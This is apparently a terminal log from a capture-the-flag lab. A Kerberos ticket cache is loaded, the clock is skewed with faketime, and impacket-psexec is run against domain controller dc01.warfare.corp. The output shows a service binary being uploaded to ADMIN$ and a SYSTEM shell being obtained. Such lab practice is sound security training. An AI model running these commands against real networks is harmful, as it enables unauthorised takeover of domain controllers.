┌──(darklight㉿jinx)-[~/Documents/ctf/cwl]
└─$ export KRB5CCNAME=corpmngr.ccache
                                                                                  
┌──(darklight㉿jinx)-[~/Documents/ctf/cwl]
└─$ faketime -f "-20m21s" \          
impacket-psexec child.warfare.corp/corpmngr@dc01.warfare.corp -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc01.warfare.corp.....
[*] Found writable share ADMIN$
[*] Uploading file pebxcTLS.exe
[*] Opening SVCManager on dc01.warfare.corp.....
[*] Creating service FHJv on dc01.warfare.corp.....
[*] Starting service FHJv.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> hostname
dc01

C:\Windows\system32> whoami
nt authority\system


```
